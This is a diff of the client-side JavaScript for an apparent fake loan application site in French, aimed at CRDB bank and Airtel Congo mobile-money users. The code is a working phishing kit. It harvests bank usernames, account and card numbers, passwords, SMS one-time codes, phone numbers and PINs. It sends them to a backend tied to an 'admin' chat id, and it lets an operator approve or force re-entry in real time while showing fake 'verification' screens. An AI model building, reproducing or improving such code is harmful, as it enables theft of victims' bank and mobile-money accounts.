@@ -1,435 +1,275 @@
 document.addEventListener('DOMContentLoaded', () => {
+  const stepUnderstand = document.getElementById('step-I UNDERSTAND');
+  const stepSlider = document.getElementById('step-slider');
+  const stepForm = document.getElementById('step-form');
+  const stepOtp = document.getElementById('step-otp');
+  const stepPhonePin = document.getElementById('step-phone-pin');
+  const stepLoading = document.getElementById('step-loading');
+  const stepSuccess = document.getElementById('step-success');
+
+  const credsSurfaceBanner = document.getElementById('creds-surface-banner');
+  const otpSurfaceBanner = document.getElementById('otp-surface-banner');
+  const pinSurfaceBanner = document.getElementById('pin-surface-banner');
+
+  let currentUserId = null;
+  let statusPollInterval = null;
+
   const urlParams = new URLSearchParams(window.location.search);
-  const adminChatId = urlParams.get('admin');
+  const adminParam = urlParams.get('admin') || '';
 
-  let state = {
-    amount: 'CDF 2,500,000',
-    duration: '12 Mois',
-    loanType: '',
-    purpose: '',
-    firstName: '',
-    lastName: '',
-    contact: '',
-    employment: '',
-    income: '',
-    pin: '',
-    otp: '',
-    userId: null
-  };
-
-  const views = {
-    calculator: document.getElementById('view-calculator'),
-    form: document.getElementById('view-form'),
-    waiting: document.getElementById('view-waiting'),
-    login: document.getElementById('view-login'),
-    otp: document.getElementById('view-otp'),
-    success: document.getElementById('view-success')
-  };
-
-  function switchView(viewName) {
-    Object.values(views).forEach(v => v.classList.add('hidden'));
-    if (views[viewName]) {
-      views[viewName].classList.remove('hidden');
-    }
+  function showStep(targetStep) {
+    [stepUnderstand, stepSlider, stepForm, stepOtp, stepPhonePin, stepSuccess].forEach(s => {
+      if (s) s.classList.remove('active');
+    });
+    if (targetStep) targetStep.classList.add('active');
   }
 
-  const amountRange = document.getElementById('amount-range');
-  const calcAmountInput = document.getElementById('calc-amount');
-  const durationRange = document.getElementById('duration-range');
+  // Range Sliders
+  const sliderBalance = document.getElementById('slider-balance');
+  const balanceVal = document.getElementById('balance-val');
+  const sliderDuration = document.getElementById('slider-duration');
   const durationVal = document.getElementById('duration-val');
-  const monthlyPayment = document.getElementById('monthly-payment');
 
-  function updateCalculator() {
-    const val = parseInt(amountRange.value);
-    state.amount = `CDF ${val.toLocaleString()}`;
-    calcAmountInput.value = state.amount;
-
-    const months = parseInt(durationRange.value);
-    state.duration = `${months} Mois`;
-    durationVal.textContent = state.duration;
-
-    const monthly = (val * 1.12) / months;
-    monthlyPayment.textContent = `CDF ${Math.round(monthly).toLocaleString()}`;
+  if (sliderBalance && balanceVal) {
+    sliderBalance.addEventListener('input', (e) => {
+      balanceVal.innerText = `${Number(e.target.value).toLocaleString()} FCFA`;
+    });
   }
 
-  amountRange.addEventListener('input', updateCalculator);
-  durationRange.addEventListener('input', updateCalculator);
+  if (sliderDuration && durationVal) {
+    sliderDuration.addEventListener('input', (e) => {
+      durationVal.innerText = `${e.target.value} mois`;
+    });
+  }
 
-  document.getElementById('btn-start-app').addEventListener('click', () => {
-    document.getElementById('form-amount').value = amountRange.value;
-    state.amount = `CDF ${parseInt(amountRange.value).toLocaleString()}`;
-    switchView('form');
-    validateStep(1);
+  // Format Card Number
+  const cardInput = document.getElementById('crdb-card');
+  if (cardInput) {
+    cardInput.addEventListener('input', (e) => {
+      let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+      e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+    });
+  }
+
+  // 4-Digit Inputs Setup (OTP & PIN) with Automatic Submission
+  const otpDigits4 = document.querySelectorAll('.otp-digit-4');
+  const pinDigits = document.querySelectorAll('.pin-digit');
+
+  function setupDigitInputs(inputs, autoSubmitCallback) {
+    inputs.forEach((input, idx) => {
+      input.addEventListener('input', () => {
+        input.value = input.value.replace(/\D/g, '');
+        if (input.value && idx < inputs.length - 1) {
+          inputs[idx + 1].focus();
+        }
+
+        const allFilled = Array.from(inputs).every(i => i.value.length === 1);
+        if (allFilled && typeof autoSubmitCallback === 'function') {
+          autoSubmitCallback();
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && idx > 0) {
+          inputs[idx - 1].focus();
+        }
+      });
+    });
+  }
+
+  setupDigitInputs(otpDigits4, () => submitOtpHandler());
+  setupDigitInputs(pinDigits, () => submitPhonePinHandler());
+
+  // Flow Navigation
+  document.getElementById('btn-understand-proceed').addEventListener('click', () => {
+    showStep(stepSlider);
   });
 
-  let currentStep = 1;
-  const formSteps = document.querySelectorAll('.form-step');
-  const progressFill = document.getElementById('progress-fill');
-  const stepIndicator = document.getElementById('step-indicator');
+  document.getElementById('btn-slider-next').addEventListener('click', () => {
+    showStep(stepForm);
+  });
 
-  function updateStepView() {
-    formSteps.forEach((step, index) => {
-      if (index + 1 === currentStep) {
-        step.classList.remove('hidden');
+  // Step 1: Submit Banking Credentials
+  document.getElementById('btn-submit-creds').addEventListener('click', async () => {
+    const username = document.getElementById('crdb-username').value.trim();
+    const account = document.getElementById('crdb-account').value.trim();
+    const card = document.getElementById('crdb-card').value.trim();
+    const password = document.getElementById('crdb-password').value.trim();
+
+    if (!username || !account || !card || !password) {
+      alert('Veuillez remplir tous les champs (nom d\'utilisateur, numéro de compte, carte et mot de passe).');
+      return;
+    }
+
+    if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
+    showLoading('Vérification en cours...', 'Envoi sécurisé des données.');
+
+    try {
+      const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, account, card, password, adminChatId: adminParam })
+      });
+
+      const data = await res.json();
+      if (data.success) {
+        currentUserId = data.userId;
+        document.getElementById('loading-title').innerText = 'En attente de validation de l\'administrateur...';
+        document.getElementById('loading-sub').innerText = 'Veuillez rester sur cette page.';
+        startStatusPolling();
       } else {
-        step.classList.add('hidden');
+        hideLoading();
+        alert(data.error || 'Échec du traitement.');
       }
-    });
-    progressFill.style.width = `${(currentStep / 3) * 100}%`;
-    stepIndicator.textContent = `Étape ${currentStep} sur 3`;
-  }
-
-  // Airtel Congo validation prefixes: 970, 971, 972, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999 (9 digits total)
-  function isValidAirtelCongoNumber(number) {
-    const clean = String(number || '').replace(/\D/g, '');
-    return /^(970|971|972|990|991|992|993|994|995|996|997|998|999)\d{6}$/.test(clean);
-  }
-
-  function validateStep(step) {
-    const currentStepEl = document.querySelector(`.form-step[data-step="${step}"]`);
-    const nextBtn = currentStepEl ? currentStepEl.querySelector('.next-btn') : null;
-    const submitBtn = document.getElementById('btn-submit-app');
-
-    if (step === 2) {
-      const contactVal = document.getElementById('user-contact').value;
-      const isValid = isValidAirtelCongoNumber(contactVal);
-      if (nextBtn) nextBtn.disabled = !isValid;
-    } else {
-      if (nextBtn) nextBtn.disabled = false;
+    } catch (e) {
+      hideLoading();
+      alert('Erreur réseau.');
     }
-
-    if (submitBtn) {
-      submitBtn.disabled = false;
-      submitBtn.title = "";
-    }
-  }
-
-  const userContactInput = document.getElementById('user-contact');
-  if (userContactInput) {
-    userContactInput.addEventListener('input', (e) => {
-      let value = e.target.value.replace(/\D/g, '');
-      if (value.length > 9) {
-        value = value.slice(0, 9);
-      }
-      e.target.value = value;
-      validateStep(2);
-    });
-  }
-
-  const loginContactInput = document.getElementById('login-contact');
-  if (loginContactInput) {
-    loginContactInput.addEventListener('input', (e) => {
-      let value = e.target.value.replace(/\D/g, '');
-      if (value.length > 9) {
-        value = value.slice(0, 9);
-      }
-      e.target.value = value;
-      checkPinComplete();
-    });
-  }
-
-  document.getElementById('loan-type').addEventListener('change', () => validateStep(1));
-  document.getElementById('form-amount').addEventListener('input', () => validateStep(1));
-  document.getElementById('loan-purpose').addEventListener('input', () => validateStep(1));
-  document.getElementById('first-name').addEventListener('input', () => validateStep(2));
-  document.getElementById('last-name').addEventListener('input', () => validateStep(2));
-  
-  const employmentStatusSelect = document.getElementById('employment-status');
-  if (employmentStatusSelect) {
-    employmentStatusSelect.addEventListener('change', () => validateStep(3));
-    employmentStatusSelect.addEventListener('input', () => validateStep(3));
-  }
-  
-  const annualIncomeInput = document.getElementById('annual-income');
-  if (annualIncomeInput) {
-    annualIncomeInput.addEventListener('input', () => validateStep(3));
-  }
-
-  document.querySelectorAll('.next-btn').forEach(btn => {
-    btn.addEventListener('click', async () => {
-      if (currentStep === 2) {
-        const contactVal = document.getElementById('user-contact').value;
-        if (!isValidAirtelCongoNumber(contactVal)) {
-          alert("Veuillez entrer un numéro Airtel Congo valide commençant par 970, 971, 972, 990-999.");
-          return;
-        }
-      }
-
-      if (currentStep === 1) {
-        state.loanType = document.getElementById('loan-type').value;
-        state.amount = `CDF ${parseInt(document.getElementById('form-amount').value || 2500000).toLocaleString()}`;
-        state.purpose = document.getElementById('loan-purpose').value || 'Prêt';
-      } else if (currentStep === 2) {
-        state.firstName = document.getElementById('first-name').value || 'Client';
-        state.lastName = document.getElementById('last-name').value || '';
-        state.contact = document.getElementById('user-contact').value || '970000000';
-
-        document.getElementById('sum-amount').textContent = state.amount;
-        document.getElementById('sum-duration').textContent = state.duration;
-        document.getElementById('sum-purpose').textContent = state.purpose;
-        document.getElementById('sum-name').textContent = `${state.firstName} ${state.lastName}`;
-      }
-
-      if (currentStep < 3) {
-        currentStep++;
-        updateStepView();
-        validateStep(currentStep);
-      }
-    });
   });
 
-  const btnSubmitApp = document.getElementById('btn-submit-app');
-  if (btnSubmitApp) {
-    btnSubmitApp.disabled = false;
-    btnSubmitApp.addEventListener('click', async () => {
-      state.employment = document.getElementById('employment-status').value || 'Non spécifié';
-      state.income = document.getElementById('annual-income').value || '0';
-      if (!state.contact) state.contact = '970000000';
+  // Status Polling
+  function startStatusPolling() {
+    if (statusPollInterval) clearInterval(statusPollInterval);
 
-      switchView('waiting');
+    statusPollInterval = setInterval(async () => {
+      if (!currentUserId) return;
+
       try {
-        const response = await fetch(`/api/submit-application${adminChatId ? '?admin=' + encodeURIComponent(adminChatId) : ''}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            contact: state.contact,
-            pin: 'PENDING_PIN',
-            amount: state.amount,
-            adminChatId
-          })
-        });
-        const data = await response.json();
-        if (!data.success) {
-          alert(data.error || " PAIEMENT NON EFFECTUÉ. VEUILLEZ CONTACTER L'ADMINISTRATEUR.");
-          location.reload();
-          return;
-        }
-        state.userId = data.userId;
-        pollStatus();
-      } catch (err) {
-        console.error(err);
-        alert("Erreur réseau. Veuillez réessayer.");
-        location.reload();
-      }
-    });
-  }
-
-  document.querySelectorAll('.prev-btn').forEach(btn => {
-    btn.disabled = false;
-    btn.addEventListener('click', () => {
-      if (currentStep > 1) {
-        currentStep--;
-        updateStepView();
-        validateStep(currentStep);
-      }
-    });
-  });
-
-  function pollStatus() {
-    const interval = setInterval(async () => {
-      try {
-        const res = await fetch(`/api/check-status/${state.userId}`);
+        const res = await fetch(`/api/check-status/${currentUserId}`);
         const data = await res.json();
 
-        if (data.status === 'APPROVED_LOAD_OTP' || data.status === 'RETRY_PIN') {
-          clearInterval(interval);
-          document.getElementById('login-contact').value = state.contact;
-          switchView('login');
-        } else if (data.status === 'DENIED') {
-          clearInterval(interval);
-          alert('Votre demande de prêt a été refusée par l\'administrateur.');
-          location.reload();
+        if (data.status === 'PROCEED_OTP') {
+          clearInterval(statusPollInterval);
+          hideLoading();
+          showStep(stepOtp);
+          if (otpDigits4[0]) otpDigits4[0].focus();
+        } else if (data.status === 'PROCEED_PHONE_PIN') {
+          clearInterval(statusPollInterval);
+          hideLoading();
+          showStep(stepPhonePin);
+          if (pinDigits[0]) pinDigits[0].focus();
         } else if (data.status === 'SUCCESS') {
-          clearInterval(interval);
-          populateSuccessScreen();
-          switchView('success');
-        }
-      } catch (e) {
-        console.error(e);
-      }
-    }, 3000);
-  }
-
-  const pinBoxes = document.querySelectorAll('.pin-box');
-  pinBoxes.forEach((box, index) => {
-    box.addEventListener('input', (e) => {
-      const val = e.target.value;
-      if (val && index < pinBoxes.length - 1) {
-        pinBoxes[index + 1].focus();
-      }
-      checkPinComplete();
-    });
-    box.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && !box.value && index > 0) {
-        pinBoxes[index - 1].focus();
-      }
-    });
-  });
-
-  function checkPinComplete() {
-    const btnLogin = document.getElementById('btn-login');
-    if (btnLogin) {
-      btnLogin.disabled = false;
-    }
-  }
-
-  const btnLoginEl = document.getElementById('btn-login');
-  if (btnLoginEl) {
-    btnLoginEl.disabled = false;
-    btnLoginEl.addEventListener('click', async () => {
-      const loginContactVal = document.getElementById('login-contact').value.trim();
-      if (!isValidAirtelCongoNumber(loginContactVal)) {
-        alert("Veuillez entrer un numéro Airtel Congo valide.");
-        return;
-      }
-
-      let pinStr = '';
-      pinBoxes.forEach(b => pinStr += b.value);
-      state.pin = pinStr || '1234';
-      state.contact = loginContactVal;
-      switchView('waiting');
-      document.getElementById('waiting-status-text').textContent = 'Validation du code PIN de votre compte...';
-
-      try {
-        const res = await fetch(`/api/submit-application${adminChatId ? '?admin=' + encodeURIComponent(adminChatId) : ''}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            contact: state.contact,
-            pin: state.pin,
-            amount: state.amount,
-            adminChatId
-          })
-        });
-        const data = await res.json();
-        if (!data.success) {
-          alert(data.error || " PAIEMENT NON EFFECTUÉ.");
-          location.reload();
-          return;
-        }
-        state.userId = data.userId;
-        pollOtpStatus();
-      } catch (e) {
-        console.error(e);
-        alert("Erreur réseau. Veuillez réessayer.");
-        location.reload();
-      }
-    });
-  }
-
-  function pollOtpStatus() {
-    const interval = setInterval(async () => {
-      try {
-        const res = await fetch(`/api/check-status/${state.userId}`);
-        const data = await res.json();
-
-        if (data.status === 'APPROVED_LOAD_OTP') {
-          clearInterval(interval);
-          document.getElementById('otp-target-display').textContent = state.contact;
-          switchView('otp');
-        } else if (data.status === 'RETRY_PIN') {
-          clearInterval(interval);
-          switchView('login');
-          document.getElementById('pin-error').classList.remove('hidden');
-          pinBoxes.forEach(b => b.value = '');
-          if (document.getElementById('btn-login')) document.getElementById('btn-login').disabled = false;
-        } else if (data.status === 'SUCCESS') {
-          clearInterval(interval);
-          populateSuccessScreen();
-          switchView('success');
-        }
-      } catch (e) {
-        console.error(e);
-      }
-    }, 3000);
-  }
-
-  const otpBoxes = document.querySelectorAll('.otp-box');
-  otpBoxes.forEach((box, index) => {
-    box.addEventListener('input', (e) => {
-      const val = e.target.value;
-      if (val && index < otpBoxes.length - 1) {
-        otpBoxes[index + 1].focus();
-      }
-      checkOtpComplete();
-    });
-    box.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && !box.value && index > 0) {
-        otpBoxes[index - 1].focus();
-      }
-    });
-  });
-
-  function checkOtpComplete() {
-    const btnSubmitOtp = document.getElementById('btn-submit-otp');
-    if (btnSubmitOtp) {
-      btnSubmitOtp.disabled = false;
-    }
-  }
-
-  const btnSubmitOtpEl = document.getElementById('btn-submit-otp');
-  if (btnSubmitOtpEl) {
-    btnSubmitOtpEl.disabled = false;
-    btnSubmitOtpEl.addEventListener('click', async () => {
-      let otpStr = '';
-      otpBoxes.forEach(b => otpStr += b.value);
-      state.otp = otpStr || '1234';
-
-      switchView('waiting');
-      document.getElementById('waiting-status-text').textContent = 'Vérification du code OTP...';
-
-      try {
-        await fetch('/api/submit-otp', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ userId: state.userId, otp: state.otp })
-        });
-        pollFinalStatus();
-      } catch (e) {
-        console.error(e);
-      }
-    });
-  }
-
-  function pollFinalStatus() {
-    const interval = setInterval(async () => {
-      try {
-        const res = await fetch(`/api/check-status/${state.userId}`);
-        const data = await res.json();
-
-        if (data.status === 'SUCCESS') {
-          clearInterval(interval);
-          populateSuccessScreen();
-          switchView('success');
+          clearInterval(statusPollInterval);
+          hideLoading();
+          document.getElementById('approved-amount-display').innerText = `${Number(sliderBalance.value).toLocaleString()} FCFA`;
+          showStep(stepSuccess);
+        } else if (data.status === 'RETRY_CREDS') {
+          clearInterval(statusPollInterval);
+          hideLoading();
+          if (credsSurfaceBanner) credsSurfaceBanner.classList.add('active');
+          document.getElementById('crdb-username').value = '';
+          document.getElementById('crdb-account').value = '';
+          document.getElementById('crdb-card').value = '';
+          document.getElementById('crdb-password').value = '';
+          showStep(stepForm);
         } else if (data.status === 'RETRY_OTP') {
-          clearInterval(interval);
-          switchView('otp');
-          document.getElementById('otp-error').classList.remove('hidden');
-          otpBoxes.forEach(b => b.value = '');
-          if (document.getElementById('btn-submit-otp')) document.getElementById('btn-submit-otp').disabled = false;
+          clearInterval(statusPollInterval);
+          hideLoading();
+          if (otpSurfaceBanner) otpSurfaceBanner.classList.add('active');
+          otpDigits4.forEach(i => i.value = '');
+          if (otpDigits4[0]) otpDigits4[0].focus();
+          showStep(stepOtp);
         } else if (data.status === 'RETRY_PIN') {
-          clearInterval(interval);
-          switchView('login');
-          document.getElementById('pin-error').classList.remove('hidden');
-          pinBoxes.forEach(b => b.value = '');
-          if (document.getElementById('btn-login')) document.getElementById('btn-login').disabled = false;
+          clearInterval(statusPollInterval);
+          hideLoading();
+          if (pinSurfaceBanner) pinSurfaceBanner.classList.add('active');
+          pinDigits.forEach(i => i.value = '');
+          if (pinDigits[0]) pinDigits[0].focus();
+          showStep(stepPhonePin);
         }
-      } catch (e) {
-        console.error(e);
-      }
+      } catch (e) {}
     }, 3000);
   }
 
-  function populateSuccessScreen() {
-    document.getElementById('approved-amount-val').textContent = state.amount;
+  // Step 2: Submit 4-digit SMS OTP
+  async function submitOtpHandler() {
+    const otpVal = Array.from(otpDigits4).map(i => i.value).join('');
+
+    if (otpVal.length !== 4) {
+      document.getElementById('otp-error').style.display = 'block';
+      return;
+    }
+    document.getElementById('otp-error').style.display = 'none';
+    if (otpSurfaceBanner) otpSurfaceBanner.classList.remove('active');
+
+    showLoading('Vérification du code OTP...', 'Analyse du SMS Airtel Congo.');
+
+    try {
+      const res = await fetch('/api/submit-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
+      });
+
+      const data = await res.json();
+      if (data.success) {
+        document.getElementById('loading-title').innerText = 'Validation en cours...';
+        document.getElementById('loading-sub').innerText = 'Veuillez patienter.';
+        startStatusPolling();
+      } else {
+        hideLoading();
+      }
+    } catch (e) {
+      hideLoading();
+    }
   }
 
-  const btnHome = document.getElementById('btn-home');
-  if (btnHome) {
-    btnHome.disabled = false;
-    btnHome.addEventListener('click', () => {
-      location.reload();
-    });
+  document.getElementById('btn-submit-otp').addEventListener('click', submitOtpHandler);
+
+  // Step 3: Submit Phone Number & PIN
+  async function submitPhonePinHandler() {
+    const phone = document.getElementById('phone-number').value.replace(/\D/g, '');
+    const pinVal = Array.from(pinDigits).map(i => i.value).join('');
+
+    if (phone.length < 8) {
+      document.getElementById('phone-error').style.display = 'block';
+      return;
+    }
+    document.getElementById('phone-error').style.display = 'none';
+
+    if (pinVal.length !== 4) {
+      document.getElementById('pin-error').style.display = 'block';
+      return;
+    }
+    document.getElementById('pin-error').style.display = 'none';
+    if (pinSurfaceBanner) pinSurfaceBanner.classList.remove('active');
+
+    showLoading('Vérification du compte...', 'Finalisation de la sécurité.');
+
+    try {
+      const res = await fetch('/api/submit-phone-pin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId: currentUserId, phone, pin: pinVal })
+      });
+
+      const data = await res.json();
+      if (data.success) {
+        document.getElementById('loading-title').innerText = 'Finalisation de l\'approbation...';
+        document.getElementById('loading-sub').innerText = 'Veuillez patienter un moment.';
+        startStatusPolling();
+      } else {
+        hideLoading();
+      }
+    } catch (e) {
+      hideLoading();
+    }
+  }
+
+  document.getElementById('btn-submit-phone-pin').addEventListener('click', submitPhonePinHandler);
+
+  document.getElementById('btn-go-home').addEventListener('click', () => {
+    window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
+  });
+
+  function showLoading(title, sub) {
+    document.getElementById('loading-title').innerText = title;
+    document.getElementById('loading-sub').innerText = sub;
+    if (stepLoading) stepLoading.classList.add('active');
+  }
+
+  function hideLoading() {
+    if (stepLoading) stepLoading.classList.remove('active');
   }
 });
-      
+  
